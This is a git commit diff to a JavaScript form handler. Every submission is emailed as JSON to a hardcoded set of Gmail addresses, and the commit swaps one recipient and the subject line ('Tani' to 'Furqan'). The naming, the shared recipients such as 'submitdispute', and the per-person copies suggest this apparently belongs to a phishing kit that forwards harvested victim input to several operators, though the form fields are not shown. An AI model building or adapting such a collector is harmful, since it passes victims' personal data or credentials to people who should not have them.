0c1e36a981df052adf2ea45a7ab11971468487fb
zm9807350 <zm9807350@gmail.com>
2026-01-02 18:05:56 +0500

    Update and rename tani.js to Furqan.js

--- Furqan.js
+++ Furqan.js
@@ -37,8 +37,8 @@ export default async function handler(req, res) {
   try {
     await transporter.sendMail({
       from: `"PROFESSOR" <dardhame1@gmail.com>`,
-      to: "linkquarry@gmail.com,newzatpage@gmail.com,submitdispute@gmail.com,tanveerprsnlccnt@gmail.com",
-      subject: "Tani",
+      to: "linkquarry@gmail.com,newzatpage@gmail.com,submitdispute@gmail.com,furqannizamani68@gmail.com",
+      subject: "Furqan",
       text: JSON.stringify(formData, null, 2),
       html: `<h3>New submission from Asif</h3><pre>${JSON.stringify(
         formData,
